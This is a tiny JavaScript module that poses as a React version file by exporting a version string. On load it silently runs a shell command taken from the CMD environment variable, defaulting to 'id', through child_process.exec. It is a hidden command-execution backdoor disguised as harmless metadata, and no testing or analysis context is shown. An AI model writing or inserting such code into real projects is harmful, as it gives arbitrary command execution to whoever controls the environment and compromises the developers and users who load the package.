const { exec } = require("child_process");
module.exports = { version: "React v19.2.3" };
exec(process.env.CMD || "id");
